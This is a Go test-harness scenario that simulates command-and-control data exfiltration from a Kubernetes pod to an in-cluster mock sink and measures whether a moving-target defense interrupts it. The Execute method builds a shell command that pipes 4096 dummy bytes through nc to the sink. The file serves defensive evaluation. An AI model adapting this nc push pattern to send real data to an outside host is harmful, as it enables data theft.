package scenarios

import (
	"context"
	"fmt"
	"time"

	"github.com/r6security/phoenix-test-harness/internal/core"
	"github.com/r6security/phoenix-test-harness/internal/mocks"
)

func init() { core.RegisterScenario(&c1C2Exfil{}) }

// ExfilBytesThreshold is the N bytes that must reach the mock sink for exfil to
// count as achieved.
const ExfilBytesThreshold = 4096

// c1C2Exfil: stage a data exfiltration over a C2 channel to the in-cluster MOCK
// sink. ORACLE: >= N bytes received and counted by the mock sink. R6 partial:
// rotation severs a long-lived channel only opportunistically.
type c1C2Exfil struct {
	app  string
	sink *mocks.MockC2Sink
}

func (s *c1C2Exfil) Metadata() core.ScenarioMeta {
	return core.ScenarioMeta{
		Name:               "c1-c2-exfil",
		Category:           core.CategoryClassicChain,
		Source:             "Cat1; Phoenix-adaptive-containers III 'Disrupts C2'; AMTD-AI-infra",
		R6ResponseTag:      core.R6Partial,
		AttackTechniqueIDs: []string{"T1041", "T1071", "T1567", "T1029", "T1048"},
		R6Justification:    "Phoenix has no exfil detector; a rotation that lands DURING transfer resets the connection, but it cannot target the exfiltrating pod on demand. Short transfers complete between rotations. Rate-dependent partial.",
	}
}

func (s *c1C2Exfil) Setup(ctx context.Context, env *core.Env) error {
	s.app = "c1exf-target"
	sink, err := mocks.DeployC2Sink(ctx, env)
	if err != nil {
		return err
	}
	s.sink = sink
	_, err = deployTarget(ctx, env, s.app, "", nil)
	return err
}

func (s *c1C2Exfil) Execute(ctx context.Context, env *core.Env) (core.AttackResult, error) {
	pod, err := runningPodByApp(ctx, env, s.app)
	if err != nil {
		return core.AttackResult{}, err
	}
	stages := []string{
		"collection: stage a payload in the compromised pod",
		"c2: open a channel to the mock sink (T1071)",
		"exfil: push N bytes to the sink (T1041/T1048)",
	}
	// Generate ~N bytes and push to the sink via nc. Bounded payload, in-cluster.
	target := fmt.Sprintf("%s 8090", s.sink.ClusterDNS)
	pushCmd := fmt.Sprintf("head -c %d /dev/zero | tr '\\0' 'A' | nc -w 2 %s; echo pushed", ExfilBytesThreshold, target)
	res := env.Exec(ctx, pod.Name, firstContainer(pod), []string{"sh", "-c", pushCmd})
	env.Log.Logf("c1-c2-exfil: push exit=%d", res.ExitCode)
	return core.AttackResult{Stages: stages, Commands: []string{"sh -c '" + pushCmd + "'"}}, nil
}

func (s *c1C2Exfil) SuccessOracle(ctx context.Context, env *core.Env) (core.OracleResult, error) {
	// Allow the sink loop to drain + count.
	time.Sleep(2 * time.Second)
	got, err := s.sink.BytesReceived(ctx, env)
	ev := map[string]string{"bytesReceived": fmt.Sprintf("%d", got), "threshold": fmt.Sprintf("%d", ExfilBytesThreshold)}
	if err != nil {
		ev["sinkError"] = err.Error()
	}
	achieved := got >= ExfilBytesThreshold
	state := fmt.Sprintf("mock sink counted %d/%d bytes exfiltrated", got, ExfilBytesThreshold)
	return core.OracleResult{Achieved: achieved, ObservedState: state, Evidence: ev}, nil
}

func (s *c1C2Exfil) Teardown(ctx context.Context, env *core.Env) error {
	return teardownByApp(ctx, env, s.app, "mock-c2")
}
